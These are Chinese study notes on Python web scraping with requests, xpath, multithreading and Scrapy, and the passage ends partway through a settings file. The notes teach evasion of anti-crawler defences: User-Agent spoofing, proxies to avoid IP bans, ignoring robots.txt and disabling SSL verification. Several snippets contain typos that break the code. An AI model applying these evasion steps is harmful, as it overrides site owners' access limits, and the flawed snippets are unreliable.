requests\nrequests模块：python中原生的一款基于网络请求的模块，功能强大，简单便捷，效率高。\n作用：模拟浏览器发送请求。\n\n如何使用：（requests模块的编码流程）\n    -指定url\n    -发起请求（get或post）\n    -获取响应数据\n    -持久化存储（数据库或本地存储）\n\n环境安装：\n    -pip或pycharm安装\n    -anaconda自带（方便已装）\n    \n<!--more-->\n\n### **实战编码：**\n\n    - 需求：爬取拉勾网首页的数据\n        示例：\n\n```python\nimport requests\n\nif __name__ == '__main__':\n    #step 1:指定url\n    url = \"https://www.lagou.com/jobs/6889986.html?show=96e52fa1d2134ad483eac5662bcc9fc6\"\n\n    #step_2:发起请求\n    #get会返回一个响应对象\n    response = requests.get(url=url)\n\n    #step_3:获取相应数据(.text返回的是字符串形式的响应数据)\n    page_text = response.text\n    print(page_text)\n\n    #step_4:持久化存储\n    with open('./lagou.html', 'w', encoding = 'utf-8') as fp:\n        fp.write(page_text)\n    print('爬取数据结束')\n```\n- 以上代码极有可能会被网站捕获，被识别出为爬虫，所以需要实施反爬虫策略\n\n- 示例： \n  UA:User-Agent (请求载体的身份标识)\n  UA检测：门户网站的服务器会检测对应的载体身份标识，如果检测到请求的载体身份标识为某一款浏览器，\n  说明该请求是一个正常的请求。但是，如果监测到请求的载体身份标识不是基于某一款浏览器的，则表示\n  该请求为不正常的请求（爬虫），则服务器端就很有可能拒绝这次请求。\n  UA伪装:将对应的请求载体身份标识伪装成一款浏览器\n\n```python\nimport requests\n\nif __name__ == '__main__':\n    # UA伪装：将对应的User-Agent封装到一个字典中\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n\n    url = 'https://www.sogou.com/web?'\n\n    #处理url携带的参数：封装到字典中（参数为问号后面的）\n    kw = input('enter a word:')\n    param = {\n        'query': kw\n    }\n\n    # 需求的响应返回的是一个对象，对象应实例化\n    response = requests.get(url=url, params=param, headers=headers)\n\n    # 确认相应数据是txt类型的\n    page_text = response.text\n    fileName = kw+'.html'\n    with open(fileName, 'w', encoding='utf-8') as fp:\n        fp.write(page_text)\n    print('保存成功。。。')\n\n```\n\n# 爬虫第二天\n\n### 有关于ajax\n#### 爬取百度翻译的内容\n\n```python\nimport requests\nimport json\n\nif __name__ == '__main__':\n    #获取url\n    post_url = 'https://fanyi.baidu.com/sug'\n    #进行UA伪装\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n    #post请求的参数处理（同get请求一致）\n    word = input('输入你想翻译的东西:')\n    data = {\n        'kw': word\n    }\n    #发送请求并生成响应\n    response = requests.post(url=post_url, data=data, headers=headers)\n    #获取响应数据:\n    #json()方法返回的是obj （如果确认响应数据是json类型的）\n    dic_obj = response.json()\n\n    #持久化存储\n    filename = word+'.json'\n    with open(filename, 'w', encoding='utf-8') as fp:\n        json.dump(dic_obj, fp=fp, ensure_ascii=False)\n\n    #将jaon格式转化成dict格式\n    with open(filename, 'r', encoding='utf-8') as fp:\n        great = json.load(fp)\n\n    #将字典格式化输出(此字典中存在字典与列表的嵌套现象)\n    for k, v in great.items():\n        if type(v) == list:\n            for i in v:\n                print(i)\n        else:\n            print(k)\n            print(v)\n\n    print('end...')\n\n```\n\n### 爬取豆瓣电影信息\n\n```python\n##此处代码示例为失败的例子，未考虑到由ajax得到的页面依旧采用了ajax\n\nimport requests\nimport json\n\nif __name__ == '__main__':\n    url = 'https://movie.douban.com/j/chart/top_list'\n    param = {\n        'type': ' 24',\n        'interval_id': ' 100:90',\n        'action': '',\n        'start': ' 1',\n        'limit': ' 20',\n    }\n    headers = {\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n\n    response = requests.get(url=url, params=param, headers=headers)\n\n    list_data = response.json()\n\n    with open('./douban.json', 'w', encoding='utf-8') as fp:\n        json.dump(list_data, fp, ensure_ascii=False)\n\n    with open('./douban.json', 'r', encoding='utf-8') as fp:\n        great = json.load(fp)\n\n    print(great)\n```\n# 爬虫学习第三天\n### 爬取国家药监总局部分信息\n\n```python\nimport requests\nimport json\n\nif __name__ == '__main__':\n    url = 'http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsList'\n    url_2 = 'http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsById'\n    headers = {\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n    #爬取的页数\n    page_ = input(\"请输入您想爬取的信息页数：\")\n    for page in range(1, int(page_)+1):\n        data = {\n            'on': 'true',\n            'page': page,\n            'pageSize': '15',\n            'productName': '',\n            'conditionType': '1',\n            'applyname': '',\n            'applysn': '',\n        }\n        #id_list have many ids\n        id_list = []\n        message = []\n\n        json_list = requests.post(url=url, data=data, headers=headers).json()\n        #id_a is a dict\n        for id_a in json_list[\"list\"]:\n            id_list.append(id_a[\"ID\"])\n            #id_b是id号\n        for id_b in id_list:\n                data_2 = {\n                    \"id\": str(id_b)\n                }\n                detail_message = requests.post(url=url_2, data=data_2, headers=headers).json()\n                print(detail_message)\n                message.append(detail_message)\n    with open('./药物信息.json', 'w', encoding='utf-8') as fp:\n        json.dump(message, fp, ensure_ascii=False)\n    print('end...')\n\n'''此代码爬取时间可能有些长，也有可能会出现Timeouterror错误，多试几次可能就可以了'''\n'''出现这种情况的原因是对方服务器拒绝请求（反爬虫），，，后续继续学习反反爬虫技术'''\n```\n\n### 数据解析概述\n\n- 聚焦爬虫：爬取页面中指定的页面内容\n      -编码流程\n          1、指定url\n          2、发起请求\n          3、获取相应数据\n          4、持久化存储\n          \n  -数据解析分类：\n          -正则\n          -bs4\n          -xpath\n          \n  -数据解析原理概述\n          -解析的局部的文本内容都会在标签之间或者标签对应的属性中进行存储\n          -1、进行指定标签的定位\n          -2、标签或者标签对应属性中存储的数据值进行提取（解析）\n\n### 图片的爬取代码\n\n```python\nimport requests\n#此处url为图片地址，而非链接【地址比链接短】\nurl = 'https://tse4-mm.cn.bing.net/th/id/OIP.vLPcBX_5hWArkIbn_PqvYgHaGL?w=233&h=195&c=7&o=5&dpr=1.25&pid=1.7'\nheaders = {\n        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n}\n#图片以二进制的形式存储，所以以.content形式接收，以jpg格式存\ndata_pict = requests.get(url=url, headers=headers).content\nwith open('./beauty_pict.jpg', 'wb') as fp:\n    fp.write(data_pict)\n```\n\n# 爬虫第四天\n### 爬取百度图片（星空图片）\n\n```python\nimport requests\nimport re\nimport os\nimport time\n\nif __name__ == '__main__':\n    #创建一个文件夹，存放图片\n    if not os.path.exists('./star_sky'):\n        os.mkdir('./star_sky')\n        \n    url = 'https://cn.bing.com/images/search?q=%E6%98%9F%E7%A9%BA%E5%9B%BE%E7%89%87&qpvt=%e6%98%9f%e7%a9%ba%e5%9b%be%e7%89%87&form=IGRE&first=1&cw=1117&ch=714'\n    headers = {\n            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n    data_pict = requests.get(url=url, headers=headers).text\n\n    #正则匹配\n    ex = '<a class=.*?murl&quot;:&quot;(.*?)&quot;.*?>'\n    star_list = re.findall(ex, data_pict, re.S)\n    for i in star_list:\n        url_2 = i\n        #请求到了图片的二进制数据\n        data_2_pict = requests.get(url=url_2, headers=headers).content\n        #为图片设置名称\n        img_name = url_2.split(\"/\")[-1]\n        img_path = './star_sky/' + img_name\n        with open(img_path, 'wb') as fp:\n            fp.write(data_2_pict)\n        print(img_name + '...successful')\n        time.sleep(0.1)\n\n****************************************未完，，待更新********************************************\n```\n### xpath\n\n- xpath解析：最常用且最便捷高效的一种解析方式，具有通用性\n      -xpath解析原理：\n          -1、实例化一个etree对象，且需要将被解析的页面源码数据加载到该对象中\n          -2、调用etree对象中的xpath方法结合着xpath表达式实现标签的定位和内容的捕获\n      -如何实例化一个etree对象\n          *from lxml import etree\n          -1、将 本地的html文档中的源代码数据加载到etree对象中：\n              etree.parse(filepath)\n          -2、可以将从互联网上获取的数据加载到该对象中\n              etree.HTML('page_text')###page_text就是获取的响应数据\n          - xpath('xpath表达式')\n          -xpath表达式：\n                  - / ：表示的是从根目录结点开始定位，表示的是一个层级\n                          - // : 表示的是多个层级或从任意位置开始定位（前提是//前面没有结点）\n                          -属性定位：tag[@attrName=\"attrValue\"]\n                          -索引定位：p[n] 索引是从1开始的\n                          -取文本：\n              - /text() 获取的是标签中直系的文本内容\n              - //text() 标签中非直系的文本内容（所有的文本内容）\n              -[0] 可以去除列表框\n                  -取属性\n              -/@attrName\n              \n\n### xpath代码实战示例：\n\n```python\n#爬取妹子图片，总共有俩千多张\nimport requests\nfrom lxml import etree\nimport os\n\nif __name__ == '__main__':\n    ii = 1\n    if not os.path.exists('./girl'):\n        os.mkdir('./girl')\n    url_list = [i for i in range(1, 50)]\n    url_list[1] = ''\n\n    for page in url_list:\n        url = 'https://www.lanvshen.com/zhongguo/' + str(page) +'.html'\n        headers = {\n            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n        }\n        get_text = requests.get(url=url, headers=headers)\n        tree = etree.HTML(get_text.text)\n        pict_ = tree.xpath('//div[@class=\"hezi\"]//li')\n        for it_ in pict_:\n            img_url = it_.xpath('./a/img/@src')[0]\n            img_name = str(ii) + '.jpg'\n            img = requests.get(url=img_url, headers=headers).content\n            img_path = './girl/' + img_name\n            with open(img_path, 'wb') as fp:\n                fp.write(img)\n            print(img_name + 'sccuessful...')\n            ii = ii + 1\n\n##此代码存在许多不足之处，所爬取的图片都只是像素低的缩略图，并且下载速度较慢\n##后期将学习爬取高清图片，并进行分布式爬取\n\n```\n\n\n\n### ip代理\n\n1. 代理的原理：在请求目的网站之前，先请求代理服务器，然后让代理服务器去请求目的网站，\n   代理服务器拿到目的网站的数据后，再转发给我们的代码\n2. [这个网站可以方便的查看http请求的一些参数](http://httpbin.org) \n3. 在代码中(requests模块)使用代理：\n\n```python\n\timport requests\n\n\turl = 'http://httpbin.org'\n\theaders = {\n\t\t'User-Anget': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n\t}\n\n\t#设置代理\n\tproxy = {\n\t\t'http': '123.54.194.96:38661'\n\t}\n\tget_text = requerts.get(url=url, headers=headers, proxies=proxy).text\n\tprint(get_text)\n```\n\n4. 网络代理有付费和不需要付费的，不需要付费的不稳定，常常会失效\n5. 代理的作用是防止我们在爬取服务器的数据时被反爬虫而被封禁导致我们\n   的 ip 不能用而采取的措施，选择代理应选择隐蔽性高，不透明的\n\n### cookie \n\n* [cookie与session的差异](http://blog.sina.com.cn/s/blog_628571e601019uis.html)\n\n* [cookie技术深入](http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=200538817&idx=2&sn=1147d48f2320fa37e82a7daef4f31c11#rd )\t\t\t \n\n  - Cookie是什么？\t \n\n  Cookie 是一小段文本信息，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。\n  Cookie 包含每次用户访问站点时 Web 应用程序都可以读取的信息。\n\n  - 为什么需要Cookie？ \n\n    因为HTTP协议是无状态的，对于一个浏览器发出的多次请求，WEB服务器无法区分 是不是来源于同一个浏览器。\n    所以，需要额外的数据用于维护会话。Cookie 正是这样的一段随HTTP请求一起被传递的额外数据。\n\n  - Cookie能做什么？ \n\n    Cookie只是一段文本，所以它只能保存字符串。而且浏览器对它有大小限制以及 它会随着每次请求被发送到服务器，所以应该保证它\n    不要太大。Cookie的内容也是明文保存的，有些浏览器提供界面修改，所以， 不适合保存重要的或者涉及隐私的内容。\n\n  - Cookie 的限制\n\n    大多数浏览器支持最大为 4096 字节的 Cookie。由于这限制了 Cookie 的大小，最好用 Cookie 来存储少量数据，\n    或者存储用户 ID 之类的标识符。用户 ID 随后便可用于标识用户，以及从数据库或其他数据源中读取用户信息。 \n    浏览器还限制站点可以在用户计算机上存储的 Cookie 的数量。大多数浏览器只允许每个站点存储 20 个 Cookie；\n    如果试图存储更多 Cookie，则最旧的 Cookie 便会被丢弃。有些浏览器还会对它们将接受的来自所有站点的 Cookie\n    总数作出绝对限制，通常为 300 个。\n\n![Cookie示意图](C:/Users/Acer/Desktop/笔记/爬虫_day4_files/1.jpg)\t\n\n- 处理cookie\n  如果想要在多次请求中共享cookie，那么应该使用session\n\n### 处理不信任的SSL证书\n\n```python\nresp = resquests.get(url=url, vrrify=False).content\n\n```\n\n### 多线程\n\n* 多线程之生产者与消费者模型\n\n- 代码示例一：(Lock版)\n\n```python\n\t\"\"\"\n\t关于多线程生产者消费者模型\n\t\"\"\"\n\timport threading\n\timport time\n\timport random\n\n\tgMoney = 1000\n\tgLock = threading.Lock()\n\tgTotalTimes = 10\n\tgTimes = 0\n\n\n\t# 生产线程Producer\n\tclass Producer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal gMoney\n\t\t\tglobal gTimes\n\t\t\twhile True:\n\t\t\t\tmoney = random.randint(100, 1000)\n\t\t\t\tgLock.acquire()\n\t\t\t\tif gTimes >= gTotalTimes:\n\t\t\t\t\tgLock.release()\n\t\t\t\t\tbreak\n\t\t\t\tgMoney += money\n\t\t\t\tprint('{}生产了{}元钱，剩余{}元钱'\n\t\t\t\t\t  .format(threading.current_thread(), money, gMoney))\n\t\t\t\tgTimes += 1\n\t\t\t\tgLock.release()\n\t\t\t\ttime.sleep(0.5)\n\n\n\t# 消费线程Consumer\n\tclass Consumer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal gMoney\n\t\t\twhile True:\n\t\t\t\tmoney = random.randint(100, 1000)\n\t\t\t\tgLock.acquire()\n\t\t\t\tif gMoney >= money:\n\t\t\t\t\tgMoney -= money\n\t\t\t\t\tprint('{}消费者消费了{}元钱，剩余{}元钱'\n\t\t\t\t\t\t  .format(threading.current_thread(), money, gMoney))\n\t\t\t\t# 若剩余金额不足以消费，则退出循环\n\t\t\t\telse:\n\t\t\t\t\tif gTimes >= gTotalTimes:\n\t\t\t\t\t\tgLock.release()\n\t\t\t\t\t\tbreak\n\t\t\t\t\tprint('{}消费者准备消费{}元钱，剩余{}元钱，不足！'\n\t\t\t\t\t\t  .format(threading.current_thread(), money, gMoney))\n\t\t\t\tgLock.release()\n\t\t\t\ttime.sleep(0.5)\n\n\n\tdef mainIt():\n\t\t# 设置3个消费线程\n\t\tfor x in range(3):\n\t\t\tt = Consumer(name='消费者线程{}'.format(x))\n\t\t\tt.start()\n\t\t\t# 设置5个生产线程\n\n\t\tfor x in range(5):\n\t\t\tt = Producer(name='生产者线程{}'.format(x))\n\t\t\tt.start()\n\n\n\tif __name__ == '__main__':\n\t\tmainIt()\n\n```\n\n- 代码示例二：(condition版)\n\n```python\n \n\timport threading\n\timport random\n\timport time\n\n\tgMoney = 1000\n\tgCondition = threading.Condition()  # 等同于threading.Lock\n\tgTimes = 0\n\tgTotalTimes = 5\n\t\n\n\tclass Producer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal gMoney\n\t\t\tglobal gCondition\n\t\t\tglobal gTimes\n\t\t\twhile True:\n\t\t\t\tmoney = random.randint(100, 1000)\n\t\t\t\tgCondition.acquire()  # 加锁（全局变量改变前（gMoney））\n\t\t\t\tif gTimes >= gTotalTimes:\n\t\t\t\t\tgCondition.release()  # 解锁\n\t\t\t\t\tprint(\"当前生产者总共生产了%s次\" % gTimes)\n\t\t\t\t\tbreak\n\t\t\t\tgMoney += money\n\t\t\t\tprint(\"%s当前存入%s元钱，剩余%s元线\" % (threading.current_thread(), money, gMoney))\n\t\t\t\tgTimes += 1\n\t\t\t\tgCondition.notify_all()  # 通知正在等待的线程（wait）\n\t\t\t\tgCondition.release()\n\t\t\t\ttime.sleep(0.5)\n\n\n\tclass Cosumer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal gMoney\n\t\t\twhile True:\n\t\t\t\tmoney = random.randint(100, 1000)\n\t\t\t\tgCondition.acquire()\n\t\t\t\twhile gMoney < money:\n\t\t\t\t\tif gTimes >= gTotalTimes:\n\t\t\t\t\t\tgCondition.release()\n\t\t\t\t\t\treturn\n\t\t\t\t\tprint(\"%s准备消费%d元钱，剩余%d元钱，不足\" % (threading.current_thread(), money, gMoney))\n\t\t\t\t\tgCondition.wait()  # 等待状态  （获取锁） 直到生产者把钱加上 （有钱了再去排队消费）\n\t\t\t\tgMoney -= money\n\t\t\t\tprint(\"%s消费了%d元钱，剩余%d元钱\" % (threading.current_thread(), money, gMoney))\n\t\t\t\tgCondition.release()\n\t\t\t\ttime.sleep(0.5)\n\n\n\tdef main():\n\t\tfor x in range(3):\n\t\t\tt = Cosumer(name=\"消费者线程%s\" % x)\n\t\t\tt.start()\n\t\tfor y in range(5):\n\t\t\tt1 = Producer(name=\"生产者线程%s\" % y)\n\t\t\tt1.start()\n\n\n\tif __name__ == '__main__':\n\t\tmain()\n\n```\n\n- 多线程Lock与condition方法总结：\n  1. 在上述的例子中，lock方法虽然实现了多线程的使用，但是当消费者资金不足时，程序在当前线程会重新whlie True，\n     这就导致了该线程需要再次上锁和解锁，这就导致了CPU的浪费\n  2. 当我们使用condition方法时，每当消费者资金不足，该线程无需重新while True，也不需要再次的上锁和解锁，\n     使用wait()，使当资金不足时的消费者线程在wait()暂停并解锁，等待条件满足时再次从wait()处开始执行，这样就\n     减少了循环过程中因上锁解锁而导致的CPu资源浪费\n\n* Queue线程安全队列\n  在线程中，访问一些全局变量，枷锁是一个经常的过程，如果你是想把某个数据存储到某个队列中，那么python内置了一个线程安全的模块\n  叫做queue模块。python中的queue模块中提供了同步的、线程安全的模块，其中队列Queue为先进先出，实现了原子操作，即要么不做，要\n  么做完。可使用队列来实现线程的同步。相关函数如下：\n  作用：\n  　　　解耦：使程序直接实现松耦合，修改一个函数，不会有串联关系。\n  　　　提高处理效率：ＦＩＦＯ　＝　现进先出，ＬＩＦＯ　＝　后入先出。\n\n1. Queue.Queue(maxsize=0)   FIFO， 如果maxsize小于1就表示队列长度无限\n\n2. Queue.LifoQueue(maxsize=0)   LIFO， 如果maxsize小于1就表示队列长度无限\n\n3. Queue.qsize()   返回队列的大小\n\n4. Queue.empty()   如果队列为空，返回True,反之False\n\n5. Queue.full()   如果队列满了，返回True,反之False\n\n6. Queue.get([block[, timeout]])   读队列，取出数据 ，没有数据将会等待timeout等待时间\n\n7. Queue.put(item, [block[, timeout]])   写队列，放入数据，timeout等待时间\n\n8. Queue.queue.clear()   清空队列\n\n9. class queue.PriorityQueue(maxsize=0) 存储数据时可设置优先级的队列，优先级设置数越小等级越高\n\n10. Queue.get(timeout = 1)如果1秒后没取到数据就退出\n\n11. Queue.get_nowait() 取数据，如果没数据抛queue.Empty异常\n\n12. Queue.task_done()后续调用告诉队列，任务的处理是完整的。\n\n```python\n\tfrom queue import Queue\n\timport time\n\timport threading\n\n\n\t# 在队列中放入数值\n\tdef set_value(q):\n\t\tindex = 0\n\t\twhile True:\n\t\t\tq.put(index)\n\t\t\tindex += 1\n\t\t\ttime.sleep(0.8)\n\n\n\t# 取出队列中的数值\n\tdef get_value(q):\n\t\twhile True:\n\t\t\tprint(q.get())\n\n\n\tdef main():\n\t\t# 产生一个队列\n\t\tq = Queue(1)\n\t\tt1 = threading.Thread(target=set_value, args=[q])\n\t\tt2 = threading.Thread(target=get_value, args=[q])\n\n\t\tt1.start()\n\t\tt2.start()\n\n\n\tif __name__ == '__main__':\n\t\tmain()\n\n```\n\n* 生产者与消费者模型\n\n- 代码示例三：(Queue版)\n\n```python\n\timport threading,time\n\t#python2  from Queue import Queue\n\t#python3\n\timport queue\n\t \n\tclass Producer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal queue\n\t\t\tcount = 0\n\t\t\twhile True:\n\t\t\t\t#qsize返回queue内部长度\n\t\t\t\tif queue.qsize() < 1000:\n\t\t\t\t\tfor i in range(100):\n\t\t\t\t\t\tcount += 1\n\t\t\t\t\t\tmsg = '生成产量'+str(count)\n\t\t\t\t\t\t#put是往queue中放入\n\t\t\t\t\t\tqueue.put(msg)\n\t\t\t\t\t\tprint(msg)\n\t\t\t\ttime.sleep(0.5)\n\tclass Consumer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal queue\n\t\t\twhile True:\n\t\t\t\tif queue.qsize() > 100:\n\t\t\t\t\tfor i in range(3):\n\t\t\t\t\t\t#get从queue中取出一个值\n\t\t\t\t\t\tmsg = self.name + \"消费了\"+queue.get()\n\t\t\t\t\t\tprint(msg)\n\t\t\t\ttime.sleep(1)\n\tif __name__ == '__main__':\n\t\tqueue = queue.Queue()\n\t\tfor i in range(500):\n\t\t\tqueue.put(\"初始产品\"+str(i))\n\t\tfor i in range(2):\n\t\t\tp = Producer()\n\t\t\tp.start()\n\t\tfor i in range(5):\n\t\t\tc = Consumer()\n\t\t\tc.start()\n\t\t\t\n```\n\n### 爬虫之多线程\n\n* 多线程爬虫框架代码\n\n```python\n\timport requests\n\tfrom lxml import etree\n\timport os\n\timport re\n\tfrom queue import Queue\n\timport threading\n\n\t\"\"\" \n\t我们引入了threading这个包，我们将使用这个包中的\n\tThread类，并在我们自定义的类中继承这个Thread类\n\t\"\"\"\n\n\n\t# 生产者线程\n\tclass Procuder(threading.Thread):\n\t\theaders = {\n\t\t\t\t'User-Agent': '... 浏览器...'\n\t\t}\n\n\t\t\"\"\" 重写继承于父类的__init__方法 \"\"\"\n\t\t\"\"\" 我们继承了Thread这个类，在调用类中的方法时可能需要许多参数，我们用*args和**kwargs来接收\"\"\"\n\t\tdef __init__(self, page_queue, img_queue, *args, **kwargs):\n\t\t\tsuper(Procuder, self).__init__(*args, **kwargs)\n\t\t\tself.page_queue = page_queue\n\t\t\tself.img_queue = img_queue\n\n\t\t\"\"\" 重写继承于父类的run方法，改成我们想要的方法\"\"\"\n\t\t\"\"\" 从存放每页的url的队列中逐一挑出一个url并传入parse_page中\n\t\t\t获取每页的url\n\t\t\"\"\"\n\t\tdef run(self):\n\t\t\twhile True:\n\t\t\t\tif self.page_queue.empty():\n\t\t\t\t\tbreak\n\t\t\t\turl = self.page_queue.get()\n\t\t\t\tself.parse_page(url)\n\n\t\tdef parse_page(self, url):\n\t\t\t\"\"\" \n\t\t\t.......\n\t\t\t\n\t\t\t获取每页的响应数据，并从中提取出每张图片的\n\t\t\turl和name，并放入队列中\n\t\t\t\"\"\"\n\n\n\t# 消费者线程\n\tclass Consumer(threading.Thread):\n\t\tdef __init__(self, page_queue, img_queue, *args, **kwargs):\n\t\t\tsuper(Procuder, self).__init__(*args, **kwargs)\n\t\t\tself.page_queue = page_queue\n\t\t\tself.img_queue = img_queue\n\n\t\tdef run(self):\n\t\t\twhile True:\n\t\t\t\tif self.img_queue.empty() and self.page_queue.empty():\n\t\t\t\t\tbreak\n\t\t\t\t\t\"\"\"\n\t\t\t\t\t......\n\t\t\t\t\t\n\t\t\t\t\t利用从队列中获取的每张图片的url和name，进行图片的获取和永久储存\n\t\t\t\t\t\"\"\"\n\n\tdef main():\n\t\t\"\"\" 设置页数和图片的url队列\"\"\"\n\t\tpage_queue = Queue()\n\t\timg_queue = Queue()\n\n\t\t# 将每页的url放到页数队列中\n\t\tfor x in range(1, 101):\n\t\t\turl = 'http://........ %d' % x\n\t\t\tpage_queue.put(url)\n\n\t\t# 设置5个生产者线程\n\t\tfor x in range(5):\n\t\t\tt = Procuder(page_queue, img_queue)\n\t\t\tt.start()\n\n\t\t# 设置5个消费者线程\n\t\tfor x in range(5):\n\t\t\tt = Consumer(page_queue, img_queue)\n\t\t\tt.start()\n\n\n\tif __name__ == '__main__':\n\t\tmain()\n\n```\n\n* 多线程爬虫实战代码\n\n```python\n\timport requests\n\timport re\n\tfrom lxml import etree\n\timport threading\n\timport os\n\timport queue\n\tfrom urllib import request\n\n\t# 生产图片的url和name\n\tclass ProimgUrl(threading.Thread):\n\t\tdef __init__(self, page_queue, img_queue, headers, *args, **kwargs):\n\t\t\tsuper().__init__(*args, **kwargs)\n\t\t\tself.page_queue = page_queue\n\t\t\tself.img_queue = img_queue\n\t\t\tself.headers = headers\n\n\t\tdef run(self):\n\t\t\twhile True:\n\t\t\t\tif self.page_queue.empty():\n\t\t\t\t\tbreak\n\t\t\t\telse:\n\t\t\t\t\turl = self.page_queue.get()\n\t\t\t\t\tself.parse_page(url)\n\n\t\tdef parse_page(self, url):\n\t\t\timg_get = requests.get(url=url, headers=self.headers).text\n\t\t\ttree = etree.HTML(img_get)\n\t\t\timg_it = tree.xpath('//div[@class=\"page-content text-center\"]//a')\n\t\t\tfor it in img_it:\n\t\t\t\timg_url = it.xpath('./img[@class!=\"gif\"]/@data-original')[0]\n\t\t\t\talt = it.xpath('./img/@alt')[0]\n\t\t\t\talt = re.sub(r'[\\?？.!！，。\\/\\*]', '', alt)\n\t\t\t\t# 利用splitext截取图片的后缀名\n\t\t\t\tsuffix = os.path.splitext(img_url)[1]\n\t\t\t\timg_name = alt + suffix\n\t\t\t\tself.img_queue.put((img_url, img_name))\n\n\n\t# 获取图片并储存\n\tclass ConimgName(threading.Thread):\n\t\tdef __init__(self, page_queue, img_queue, headers, *args, **kwargs):\n\t\t\tsuper().__init__(*args, **kwargs)\n\t\t\tself.page_queue = page_queue\n\t\t\tself.img_queue = img_queue\n\t\t\tself.headers = headers\n\n\t\tdef run(self):\n\t\t\twhile True:\n\t\t\t\tif self.img_queue.empty() and self.page_queue.empty():\n\t\t\t\t\tbreak\n\t\t\t\telse:\n\t\t\t\t\timg_url, img_name = self.img_queue.get()\n\t\t\t\t\t# 用urlli包下的request.urlretrieve模块，可以更方便的获取和存储图片\n\t\t\t\t\trequest.urlretrieve(img_url, './smile/'+img_name)\n\t\t\t\t\tprint(img_name + ' 下载成功...')\n\n\tdef main():\n\t\tif not os.path.exists('./smile'):\n\t\t\tos.mkdir('./smile')\n\t\theaders = {\n\t\t\t'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '\n\t\t\t\t\t\t  'Chrome/80.0.3987.149 Safari/537.36 '\n\t\t}\n\t\tpage_queue = queue.Queue(100)\n\t\timg_queue = queue.Queue(1000)\n\n\t\tfor x in range(1, 10):\n\t\t\turl = 'https://www.doutula.com/photo/list/?page=' + str(x)\n\t\t\tpage_queue.put(url)\n\n\t\tfor i in range(5):\n\t\t\tt = ProimgUrl(page_queue, img_queue, headers)\n\t\t\tt.start()\n\n\t\tfor i in range(5):\n\t\t\tt = ConimgName(page_queue, img_queue, headers)\n\t\t\tt.start()\n\n\n\tif __name__ == '__main__':\n\t\tmain()\n\n```\n\n* 多线程爬虫的一些坑：多线程爬虫爬取的内容是无序的\n\n\n\n# 爬虫第五天\n\n## scrapy爬虫框架\n\n[关于xpath选择器selector的网址](https://zhuanlan.zhihu.com/p/25443389)\n\n\n\n![scrapy框架示意图](https://img-blog.csdnimg.cn/20200328091921480.png)\n\n1. 创建项目\n\n   ​\tscrapy startproject #^%#^(项目名字)\n\n   \n\n2. 创建爬虫\n\n   ​\tscrapy genspider 爬虫名字 网络域名\n\n   注意：\n\n    * 爬虫名字不要和项目名字一样\n    * 网站域名是允许爬虫采集的域名\n      - baidu.com\n\n![创建项目与配置环境后各部分组件](https://img-blog.csdn.net/20180704211604860?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNDcyNzY1/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)\n\nitem文件是存储数据的\n\n* 在setting文件（程序启动被首先检查的文件）\n\n* BOT_NAME = 爬虫的名字\n\n* ROBOTSTXT_OBEY = 网络君子协议君子协议（不遵守）， 布尔\n\n* CONCURRENT_REQUESTS = 爬虫的并发量\n\n* DOWOLOAD_DELAY = 下载延迟，一般是1.5或2，小项目不用管\n\n* COOKLES_ENABLED = cookiede的使用，布尔\n\n* DEFAULT_REQUEST_HEADERS = 默认请求头\n\n* ITEM_PIPELINES = 管道文件\n\n  \n\n  ### setting文件详解\n\n  ```python\n  # -*- coding: utf-8 -*-\n   \n  # Scrapy settings for TestSpider project\n  #\n  # For simplicity, this file contains only settings considered important or\n  # commonly used. You can find more settings consulting the documentation:\n  #\n  #     https://doc.scrapy.org/en/latest/topics/settings.html\n  #     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  #     https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n   \n  BOT_NAME = 'TestSpider'\n   \n  SPIDER_MODULES = ['TestSpider.spiders']\n  NEWSPIDER_MODULE = 'TestSpider.spiders'\n   \n   \n  # Crawl responsibly by identifying yourself (and your website) on the user-agent\n  #USER_AGENT = 'TestSpider (+http://www.yourdomain.com)'\n   \n  USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0'\n   \n  # Obey robots.txt rules\n  # Scrapy框架默认遵守 robots.txt 协议规则，robots规定了一个网站中，哪些地址可以请求，哪些地址不能请求。\n  # 默认是True，设置为False不遵守这个协议。\n  ROBOTSTXT_OBEY = False\n   \n   \n  # Configure maximum concurrent requests performed by Scrapy (default: 16)\n 